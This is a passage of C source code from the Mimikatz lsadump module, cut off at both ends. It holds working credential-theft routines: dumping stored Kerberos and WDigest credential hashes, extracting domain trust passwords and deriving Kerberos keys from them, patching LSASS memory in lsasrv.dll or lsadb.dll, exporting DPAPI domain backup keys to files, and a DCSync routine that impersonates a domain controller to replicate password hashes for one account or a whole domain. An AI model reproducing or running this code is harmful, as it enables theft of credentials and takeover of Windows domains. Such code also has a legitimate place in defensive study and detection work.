		pWDigest = (PWDIGEST_CREDENTIALS) Buffer;
		for(i = 0; i < pWDigest->NumberOfHashes; i++)
		{
			kprintf(L"    %02u  ", i + 1);
			kull_m_string_wprintf_hex(pWDigest->Hash[i], MD5_DIGEST_LENGTH, 0);
			kprintf(L"\n");
		}
		break;
	case 3:
		pKerb = (PKERB_STORED_CREDENTIAL) Buffer;
		kprintf(L"    Default Salt : %.*s\n", pKerb->DefaultSaltLength / sizeof(wchar_t), (PBYTE) pKerb + pKerb->DefaultSaltOffset);
		pKeyData = (PKERB_KEY_DATA) ((PBYTE) pKerb + sizeof(KERB_STORED_CREDENTIAL));
		pKeyData = kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->CredentialCount, L"Credentials");
		kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->OldCredentialCount, L"OldCredentials");
		break;
	case 4:
		pKerbNew = (PKERB_STORED_CREDENTIAL_NEW) Buffer;
		kprintf(L"    Default Salt : %.*s\n    Default Iterations : %u\n", pKerbNew->DefaultSaltLength / sizeof(wchar_t), (PBYTE) pKerbNew + pKerbNew->DefaultSaltOffset, pKerbNew->DefaultIterationCount);
		pKeyDataNew = (PKERB_KEY_DATA_NEW) ((PBYTE) pKerbNew + sizeof(KERB_STORED_CREDENTIAL_NEW));
		pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->CredentialCount, L"Credentials");
		pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->ServiceCredentialCount, L"ServiceCredentials");
		pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OldCredentialCount, L"OldCredentials");
		kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OlderCredentialCount, L"OlderCredentials");
		break;
	case 5:
		kprintf(L"    Random Value : ");
		kull_m_string_wprintf_hex(Buffer, BufferSize, 0);
		kprintf(L"\n");
		break;
	default:
		kull_m_string_wprintf_hex(Buffer, BufferSize, 1);
		kprintf(L"\n");
	}
}

PKERB_KEY_DATA kuhl_m_lsadump_lsa_keyDataInfo(PVOID base, PKERB_KEY_DATA keys, USHORT Count, PCWSTR title)
{
	USHORT i;
	if(Count)
	{
		if(title)
			kprintf(L"    %s\n", title);
		for(i = 0; i < Count; i++)
		{
			kprintf(L"      %s : ", kuhl_m_kerberos_ticket_etype(keys[i].KeyType));
			kull_m_string_wprintf_hex((PBYTE) base + keys[i].KeyOffset, keys[i].KeyLength, 0);
			kprintf(L"\n");
		}
	}
	return (PKERB_KEY_DATA) ((PBYTE) keys + Count * sizeof(KERB_KEY_DATA));
}

PKERB_KEY_DATA_NEW kuhl_m_lsadump_lsa_keyDataNewInfo(PVOID base, PKERB_KEY_DATA_NEW keys, USHORT Count, PCWSTR title)
{
	USHORT i;
	if(Count)
	{
		if(title)
			kprintf(L"    %s\n", title);
		for(i = 0; i < Count; i++)
		{
			kprintf(L"      %s (%u) : ", kuhl_m_kerberos_ticket_etype(keys[i].KeyType), keys->IterationCount);
			kull_m_string_wprintf_hex((PBYTE) base + keys[i].KeyOffset, keys[i].KeyLength, 0);
			kprintf(L"\n");
		}
	}
	return (PKERB_KEY_DATA_NEW) ((PBYTE) keys + Count * sizeof(KERB_KEY_DATA_NEW));
}

const wchar_t * TRUST_AUTH_TYPE[] = {
	L"NONE   ",
	L"NT4OWF ",
	L"CLEAR  ",
	L"VERSION",
};
DECLARE_UNICODE_STRING(uKrbtgt, L"krbtgt");
void kuhl_m_lsadump_trust_authinformation(PLSA_AUTH_INFORMATION info, DWORD count, PNTDS_LSA_AUTH_INFORMATION infoNtds, PCWSTR prefix, PCUNICODE_STRING from, PCUNICODE_STRING dest)
{
	DWORD i, j;
	UNICODE_STRING dst, password;
	LONG kerbType[] = {KERB_ETYPE_AES256_CTS_HMAC_SHA1_96, KERB_ETYPE_AES128_CTS_HMAC_SHA1_96, KERB_ETYPE_RC4_HMAC_NT};

	kprintf(L" [%s] %wZ -> %wZ\n", prefix, from, dest);
	if(info)
	{
		for(i = 0; i < count; i++)
		{
			kprintf(L"    * "); kull_m_string_displayLocalFileTime((PFILETIME) &info[i].LastUpdateTime);
			kprintf((info[i].AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? L" - %s - " : L"- %u - ", (info[i].AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? TRUST_AUTH_TYPE[info[i].AuthType] : L"unknown?");
			kull_m_string_wprintf_hex(info[i].AuthInfo, info[i].AuthInfoLength, 1); kprintf(L"\n");

			if(info[i].AuthType == TRUST_AUTH_TYPE_CLEAR)
			{
				dst.Length = 0;
				dst.MaximumLength = from->Length + uKrbtgt.Length + dest->Length;
				if(dst.Buffer = (PWSTR) LocalAlloc(LPTR, dst.MaximumLength))
				{
					RtlAppendUnicodeStringToString(&dst, from);
					RtlAppendUnicodeStringToString(&dst, &uKrbtgt);
					RtlAppendUnicodeStringToString(&dst, dest);
					password.Length = password.MaximumLength = (USHORT) info[i].AuthInfoLength;
					password.Buffer = (PWSTR) info[i].AuthInfo;
					for(j = 0; j < ARRAYSIZE(kerbType); j++)
						kuhl_m_kerberos_hash_data(kerbType[j], &password, &dst, 4096);
					LocalFree(dst.Buffer);
				}
			}
		}
	}
	else if(infoNtds)
	{
		kprintf(L"    * "); kull_m_string_displayLocalFileTime((PFILETIME) &infoNtds->LastUpdateTime);
		kprintf((infoNtds->AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? L" - %s - " : L"- %u - ", (infoNtds->AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? TRUST_AUTH_TYPE[infoNtds->AuthType] : L"unknown?");
		kull_m_string_wprintf_hex(infoNtds->AuthInfo, infoNtds->AuthInfoLength, 1); kprintf(L"\n");

		if(infoNtds->AuthType == TRUST_AUTH_TYPE_CLEAR)
		{
			dst.Length = 0;
			dst.MaximumLength = from->Length + uKrbtgt.Length + dest->Length;
			if(dst.Buffer = (PWSTR) LocalAlloc(LPTR, dst.MaximumLength))
			{
				RtlAppendUnicodeStringToString(&dst, from);
				RtlAppendUnicodeStringToString(&dst, &uKrbtgt);
				RtlAppendUnicodeStringToString(&dst, dest);
				password.Length = password.MaximumLength = (USHORT) infoNtds->AuthInfoLength;
				password.Buffer = (PWSTR) infoNtds->AuthInfo;
				for(j = 0; j < ARRAYSIZE(kerbType); j++)
					kuhl_m_kerberos_hash_data(kerbType[j], &password, &dst, 4096);
				LocalFree(dst.Buffer);
			}
		}
	}
	kprintf(L"\n");
}

BYTE PATC_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xeb};
#ifdef _M_X64
BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xbb, 0x03, 0x00, 0x00, 0xc0, 0xe9};
KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-11}},
};
#elif defined _M_IX86
BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xc7, 0x45, 0xfc, 0x03, 0x00, 0x00, 0xc0, 0xe9};
KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-10}},
};
#endif
NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
{
	LSA_HANDLE hLSA;
	LSA_ENUMERATION_HANDLE hLSAEnum = 0;
	LSA_OBJECT_ATTRIBUTES oaLsa = {0};
	NTSTATUS statusEnum, status;
	PPOLICY_DNS_DOMAIN_INFO pDomainInfo;
	PTRUSTED_DOMAIN_INFORMATION_EX domainInfoEx;
	PTRUSTED_DOMAIN_AUTH_INFORMATION authinfos = NULL;
	DWORD i, returned;

	PKULL_M_PATCH_GENERIC currentReference;
	PKULL_M_MEMORY_HANDLE hMemory = NULL;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModule;
	KULL_M_MEMORY_ADDRESS aPatternMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aPatchMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory;
	LPCWSTR szSystem = NULL;
	UNICODE_STRING uSystem;

	static BOOL isPatching = FALSE;

	if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL))
		RtlInitUnicodeString(&uSystem, szSystem);

	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
	{
		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), MIMIKATZ_NT_BUILD_NUMBER))
		{
			aPatternMemory.address = currentReference->Search.Pattern;
			aPatchMemory.address = currentReference->Patch.Pattern;

			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
			{
				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
				{
					sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModule.DllBase;
					sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;
					isPatching = TRUE;
					if(!kull_m_patch(&sMemory, &aPatternMemory, currentReference->Search.Length, &aPatchMemory, currentReference->Patch.Length, currentReference->Offsets.off0, kuhl_m_lsadump_trust, argc, argv, NULL))
						PRINT_ERROR_AUTO(L"kull_m_patch");
					isPatching = FALSE;
				}
				else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
			}
		}
	}
	else
	{
		if(NT_SUCCESS(LsaOpenPolicy(szSystem ? &uSystem : NULL, &oaLsa, POLICY_VIEW_LOCAL_INFORMATION, &hLSA)))
		{
			status = LsaQueryInformationPolicy(hLSA, PolicyDnsDomainInformation, (PVOID *) &pDomainInfo);
			if(NT_SUCCESS(status))
			{
				RtlUpcaseUnicodeString(&pDomainInfo->DnsDomainName, &pDomainInfo->DnsDomainName, FALSE);
				kprintf(L"\nCurrent domain: %wZ (%wZ", &pDomainInfo->DnsDomainName, &pDomainInfo->Name);
				if(pDomainInfo->Sid)
					kprintf(L" / "); kull_m_string_displaySID(pDomainInfo->Sid);
				kprintf(L")\n");

				for(
					hLSAEnum = 0, statusEnum = LsaEnumerateTrustedDomainsEx(hLSA, &hLSAEnum, (PVOID *) &domainInfoEx, 0, &returned);
					returned && ((statusEnum == STATUS_SUCCESS) || (statusEnum == STATUS_MORE_ENTRIES));
				statusEnum = LsaEnumerateTrustedDomainsEx(hLSA, &hLSAEnum, (PVOID *) &domainInfoEx, 0, &returned)
					)
				{
					for(i = 0; i < returned; i++)
					{
						RtlUpcaseUnicodeString(&domainInfoEx[i].Name, &domainInfoEx[i].Name, FALSE);
						kprintf(L"\nDomain: %wZ (%wZ", &domainInfoEx[i].Name, &domainInfoEx[i].FlatName);
						if(domainInfoEx[i].Sid)
							kprintf(L" / "); kull_m_string_displaySID(domainInfoEx[i].Sid);
						kprintf(L")\n");

						status = LsaQueryTrustedDomainInfoByName(hLSA, &domainInfoEx[i].Name, TrustedDomainAuthInformation, (PVOID *) &authinfos);
						if(NT_SUCCESS(status))
						{
							kuhl_m_lsadump_trust_authinformation(authinfos->IncomingAuthenticationInformation, authinfos->IncomingAuthInfos, NULL, L"  In ", &pDomainInfo->DnsDomainName, &domainInfoEx[i].Name);
							kuhl_m_lsadump_trust_authinformation(authinfos->OutgoingAuthenticationInformation, authinfos->OutgoingAuthInfos, NULL, L" Out ", &domainInfoEx[i].Name, &pDomainInfo->DnsDomainName);
							kuhl_m_lsadump_trust_authinformation(authinfos->IncomingPreviousAuthenticationInformation, authinfos->IncomingAuthInfos, NULL, L" In-1", &pDomainInfo->DnsDomainName, &domainInfoEx[i].Name);
							kuhl_m_lsadump_trust_authinformation(authinfos->OutgoingPreviousAuthenticationInformation, authinfos->OutgoingAuthInfos, NULL, L"Out-1", &domainInfoEx[i].Name, &pDomainInfo->DnsDomainName);
							LsaFreeMemory(authinfos);
						}
						else PRINT_ERROR(L"LsaQueryTrustedDomainInfoByName %08x\n", status);
					}
					LsaFreeMemory(domainInfoEx);
				}
				if((statusEnum != STATUS_NO_MORE_ENTRIES) && (statusEnum != STATUS_SUCCESS))
					PRINT_ERROR(L"LsaEnumerateTrustedDomainsEx %08x\n", statusEnum);

				LsaFreeMemory(pDomainInfo);
			}
			LsaClose(hLSA);
		}
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_lsadump_LsaRetrievePrivateData(PCWSTR systemName, PCWSTR secretName, PUNICODE_STRING secret, BOOL isSecret)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	LSA_OBJECT_ATTRIBUTES oa = {0};
	LSA_HANDLE hPolicy, hSecret;
	UNICODE_STRING name, system, *cur, *old;
	LARGE_INTEGER curDate, oldDate;

	if(secretName)
	{
		RtlInitUnicodeString(&name, secretName);
		RtlInitUnicodeString(&system, systemName);
		status = LsaOpenPolicy(&system, &oa, POLICY_GET_PRIVATE_INFORMATION, &hPolicy);
		if(NT_SUCCESS(status))
		{
			if(!isSecret)
			{
				status = LsaRetrievePrivateData(hPolicy, &name, &cur);
				if(NT_SUCCESS(status))
				{
					if(cur)
					{
						*secret = *cur;
						if(secret->Buffer = (PWSTR) LocalAlloc(LPTR, secret->MaximumLength))
							RtlCopyMemory(secret->Buffer, cur->Buffer, secret->MaximumLength);
						LsaFreeMemory(cur);
					}
				}
			}
			else
			{
				status = LsaOpenSecret(hPolicy, &name, SECRET_QUERY_VALUE, &hSecret);
				if(NT_SUCCESS(status))
				{
					status = LsaQuerySecret(hSecret, &cur, &curDate, &old, &oldDate);
					if(NT_SUCCESS(status))
					{
						if(cur)
						{
							*secret = *cur;
							if(secret->Buffer = (PWSTR) LocalAlloc(LPTR, secret->MaximumLength))
								RtlCopyMemory(secret->Buffer, cur->Buffer, secret->MaximumLength);
							LsaFreeMemory(cur);
						}
						if(old)
							LsaFreeMemory(old);
					}
					LsaClose(hSecret);
				}
			}
			LsaClose(hPolicy);
		}
	}
	return status;
}

void kuhl_m_lsadump_analyzeKey(LPCGUID guid, PKIWI_BACKUP_KEY secret, DWORD size, BOOL isExport)
{
	PVOID data;
	DWORD len;
	UNICODE_STRING uString;
	PWCHAR filename = NULL, shortname;

	if(NT_SUCCESS(RtlStringFromGUID(guid, &uString)))
	{
		uString.Buffer[uString.Length / sizeof(wchar_t) - 1] = L'\0';
		shortname = uString.Buffer + 1;
		switch(secret->version)
		{
		case 2:
			kprintf(L"  * RSA key\n");
			kuhl_m_dpapi_oe_domainkey_add(guid, secret->data, secret->keyLen, TRUE);
			kuhl_m_crypto_exportRawKeyToFile(secret->data, secret->keyLen, FALSE, L"ntds", 0, shortname, isExport, TRUE);
			if(isExport)
			{
				data = secret->data + secret->keyLen;
				len = secret->certLen;
				if(filename = kuhl_m_crypto_generateFileName(L"ntds", L"capi", 0, shortname, L"pfx"))
				{
					kprintf(L"\tPFX container  : %s - \'%s\'\n", kull_m_crypto_DerAndKeyToPfx(data, len, secret->data, secret->keyLen, FALSE, filename) ? L"OK" : L"KO", filename);
					LocalFree(filename);
				}
				filename = kuhl_m_crypto_generateFileName(L"ntds", L"capi", 0, shortname, L"der");
			}
			break;
		case 1:
			kprintf(L"  * Legacy key\n");
			kuhl_m_dpapi_oe_domainkey_add(guid, (PBYTE) secret + sizeof(DWORD), size - sizeof(DWORD), FALSE);
			kull_m_string_wprintf_hex((PBYTE) secret + sizeof(DWORD), size - sizeof(DWORD), (32 << 16));
			kprintf(L"\n");
			if(isExport)
			{
				filename = kuhl_m_crypto_generateFileName(L"ntds", L"legacy", 0, shortname, L"key");
				data = (PBYTE) secret + sizeof(DWORD);
				len = size - sizeof(DWORD);
			}
			break;
		default:
			kprintf(L"  * Unknown key (seen as %08x)\n", secret->version);
			kull_m_string_wprintf_hex(secret, size, (32 << 16));
			kprintf(L"\n");
			if(isExport)
			{
				filename = kuhl_m_crypto_generateFileName(L"ntds", L"unknown", 0, shortname, L"key");
				data = secret;
				len = size;
			}
		}
		if(filename)
		{
			if(data && len)
				kprintf(L"\tExport         : %s - \'%s\'\n", kull_m_file_writeData(filename, data, len) ? L"OK" : L"KO", filename);
			LocalFree(filename);
		}
		RtlFreeUnicodeString(&uString);
	}
}

NTSTATUS kuhl_m_lsadump_getKeyFromGUID(LPCGUID guid, BOOL isExport, LPCWSTR systemName, BOOL isSecret)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	UNICODE_STRING secret;
	wchar_t keyName[48+1] = L"G$BCKUPKEY_";
	keyName[48] = L'\0';

	if(NT_SUCCESS(RtlStringFromGUID(guid, &secret)))
	{
		RtlCopyMemory(keyName + 11, secret.Buffer + 1, 36 * sizeof(wchar_t));
		RtlFreeUnicodeString(&secret);
		
		status = kuhl_m_lsadump_LsaRetrievePrivateData(systemName, keyName, &secret, isSecret);
		if(NT_SUCCESS(status))
		{
			kuhl_m_lsadump_analyzeKey(guid, (PKIWI_BACKUP_KEY) secret.Buffer, secret.Length, isExport);
			LocalFree(secret.Buffer);
		}
		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
	}
	return status;
}

NTSTATUS kuhl_m_lsadump_bkey(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	UNICODE_STRING secret;
	GUID guid;
	PCWCHAR szGuid = NULL, szSystem = NULL;
	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
	BOOL isSecret = kull_m_string_args_byName(argc, argv, L"secret", NULL, NULL);

	kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL);
	kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL);
	if(szGuid)
	{
		RtlInitUnicodeString(&secret, szGuid);
		status = RtlGUIDFromString(&secret, &guid);
		if(NT_SUCCESS(status))
		{
			kprintf(L"\n"); kull_m_string_displayGUID(&guid); kprintf(L" seems to be a valid GUID\n");
			kuhl_m_lsadump_getKeyFromGUID(&guid, export, szSystem, isSecret);
		}
		else PRINT_ERROR(L"Invalid GUID (0x%08x) ; %s\n", status, szGuid);
	}
	else
	{
		kprintf(L"\nCurrent prefered key:       ");
		status = kuhl_m_lsadump_LsaRetrievePrivateData(szSystem, L"G$BCKUPKEY_PREFERRED", &secret, isSecret);
		if(NT_SUCCESS(status))
		{
			kull_m_string_displayGUID((LPCGUID) secret.Buffer); kprintf(L"\n");
			kuhl_m_lsadump_getKeyFromGUID((LPCGUID) secret.Buffer, export, szSystem, isSecret);
			LocalFree(secret.Buffer);
		}
		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);

		kprintf(L"\nCompatibility prefered key: ");
		status = kuhl_m_lsadump_LsaRetrievePrivateData(szSystem, L"G$BCKUPKEY_P", &secret, isSecret);
		if(NT_SUCCESS(status))
		{
			kull_m_string_displayGUID((LPCGUID) secret.Buffer); kprintf(L"\n");
			kuhl_m_lsadump_getKeyFromGUID((LPCGUID) secret.Buffer, export, szSystem, isSecret);
			LocalFree(secret.Buffer);
		}
		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_lsadump_rpdata(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	UNICODE_STRING secret;
	LPCWSTR szName, szSystem = NULL;
	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL); // todo
	BOOL isSecret = kull_m_string_args_byName(argc, argv, L"secret", NULL, NULL);
	if(kull_m_string_args_byName(argc, argv, L"name", &szName, NULL))
	{
		kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL);
		status = kuhl_m_lsadump_LsaRetrievePrivateData(szSystem, szName, &secret, isSecret);
		if(NT_SUCCESS(status))
		{
			kull_m_string_wprintf_hex(secret.Buffer, secret.Length, 1 | (16<<16));
			LocalFree(secret.Buffer);
		}
		else PRINT_ERROR(L"kuhl_m_lsadump_LsaRetrievePrivateData: 0x%08x\n", status);
	}
	return STATUS_SUCCESS;
}
/*	This function `dcsync` was co-writed with
	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
*/
LPCSTR kuhl_m_lsadump_dcsync_oids[] = {
	szOID_ANSI_name,
	szOID_ANSI_sAMAccountName, szOID_ANSI_userPrincipalName, szOID_ANSI_sAMAccountType,
	szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
	szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
	szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
	szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
	szOID_ANSI_currentValue,
};
LPCSTR kuhl_m_lsadump_dcsync_oids_export[] = {
	szOID_ANSI_name,
	szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
	szOID_ANSI_unicodePwd
};
NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
{
	LSA_OBJECT_ATTRIBUTES objectAttributes = {0};
	PPOLICY_DNS_DOMAIN_INFO pPolicyDnsDomainInfo = NULL;
	RPC_BINDING_HANDLE hBinding;
	DRS_HANDLE hDrs = NULL;
	DSNAME dsName = {0};
	DRS_MSG_GETCHGREQ getChReq = {0};
	DWORD dwOutVersion = 0, i;
	DRS_MSG_GETCHGREPLY getChRep = {0};
	ULONG drsStatus;
	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL, szService;
	LPWSTR szTmpDc = NULL;
	DRS_EXTENSIONS_INT DrsExtensionsInt;
	BOOL someExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
	BOOL allData = kull_m_string_args_byName(argc, argv, L"all", NULL, NULL);
	BOOL csvOutput = kull_m_string_args_byName(argc, argv, L"csv", NULL, NULL);
	BOOL moreData = FALSE;
	if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
		if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
			szDomain = pPolicyDnsDomainInfo->DnsDomainName.Buffer;

	if(szDomain && wcschr(szDomain, L'.'))
	{
		kprintf(L"[DC] \'%s\' will be the domain\n", szDomain);
		if(!(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL) || kull_m_string_args_byName(argc, argv, L"kdc", &szDc, NULL)))
			if(kull_m_net_getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &szTmpDc))
				szDc = szTmpDc;
		
		if(szDc)
		{
			kprintf(L"[DC] \'%s\' will be the DC server\n", szDc);
			if(allData || kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
			{
				if(allData)
					kprintf(L"[DC] Exporting domain \'%s\'\n", szDomain);
				else if(szGuid)
					kprintf(L"[DC] Object with GUID \'%s\'\n", szGuid);
				else
					kprintf(L"[DC] \'%s\' will be the user account\n", szUser);

				kull_m_string_args_byName(argc, argv, L"altservice", &szService, L"ldap");
				if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, (MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
				{
					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
					{
						if(DrsExtensionsInt.dwReplEpoch)
							kprintf(L"[DC] ms-DS-ReplicationEpoch is: %u\n", DrsExtensionsInt.dwReplEpoch);
						if(kull_m_rpc_drsr_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &DrsExtensionsInt))
						{
							getChReq.V8.pNC = &dsName;
							getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
							getChReq.V8.cMaxObjects = (allData?1000:1);
							getChReq.V8.cMaxBytes = 0x00a00000; // 10M
							getChReq.V8.ulExtendedOp = (allData?0:EXOP_REPL_OBJ);

							if(getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT *) MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * ((allData? ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export) : ARRAYSIZE(kuhl_m_lsadump_dcsync_oids)) - 1)))
							{
								getChReq.V8.pPartialAttrSet->dwVersion = 1;
								getChReq.V8.pPartialAttrSet->dwReserved1 = 0;
								if (allData)
								{
									getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids_export);
									for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
										kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids_export[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
								}
								else
								{
									getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids);
									for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
										kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
								}
								RpcTryExcept
								{
									do
									{
										drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
										if(drsStatus == 0)
										{
											if(dwOutVersion == 6 && (allData || getChRep.V6.cNumObjects == 1))
											{
												if(kull_m_rpc_drsr_ProcessGetNCChangesReply(&getChRep.V6.PrefixTableSrc, getChRep.V6.pObjects))
												{
													REPLENTINFLIST* pObject = getChRep.V6.pObjects;
													for (i = 0; i < getChRep.V6.cNumObjects; i++)
													{
														if (csvOutput)
															kuhl_m_lsadump_dcsync_descrObject_csv(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock);
														else
															kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, szDomain, someExport);
														pObject = pObject->pNextEntInf;
													}
												}
												else
												{
													PRINT_ERROR(L"kull_m_rpc_drsr_ProcessGetNCChangesReply\n");
													break;
												}
												if (allData)
												{
													moreData = getChRep.V6.fMoreData;
													RtlCopyMemory(&getChReq.V8.uuidInvocIdSrc, &getChRep.V6.uuidInvocIdSrc, sizeof(UUID));
													RtlCopyMemory(&getChReq.V8.usnvecFrom, &getChRep.V6.usnvecTo, sizeof(USN_VECTOR));
												}
											}
											else PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
											kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
											ZeroMemory(&getChRep, sizeof(DRS_MSG_GETCHGREPLY));
										}
										else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
									}
									while(moreData);
									IDL_DRSUnbind(&hDrs);
								}
								RpcExcept(RPC_EXCEPTION)
									PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
								RpcEndExcept

								kull_m_rpc_drsr_free_SCHEMA_PREFIX_TABLE_data(&getChReq.V8.PrefixTableDest);
								MIDL_user_free(getChReq.V8.pPartialAttrSet);
							}
						}
					}
					kull_m_rpc_deleteBinding(&hBinding);
				}
			}
			else PRINT_ERROR(L"Missing user or guid argument\n");
		}
		else PRINT_ERROR(L"Domain Controller not present\n");
	}
	else PRINT_ERROR(L"Domain not present, or doesn\'t look like a FQDN\n");

	if(szTmpDc)
		LocalFree(szTmpDc);
	if(pPolicyDnsDomainInfo)
		LsaFreeMemory(pPolicyDnsDomainInfo);

	return STATUS_SUCCESS;
}

BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
{
	DWORD i;
	BOOL status = FALSE;
	BYTE data[LM_NTLM_HASH_LENGTH];
	for(i = 0; i < encodedDataSize; i+= LM_NTLM_HASH_LENGTH)
	{
		status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(encodedData + i, &rid, data));
		if(status)
		{
			if(isHistory)
				kprintf(L"    %s-%2u: ", prefix, i / LM_NTLM_HASH_LENGTH);
			else
				kprintf(L"  Hash %s: ", prefix);
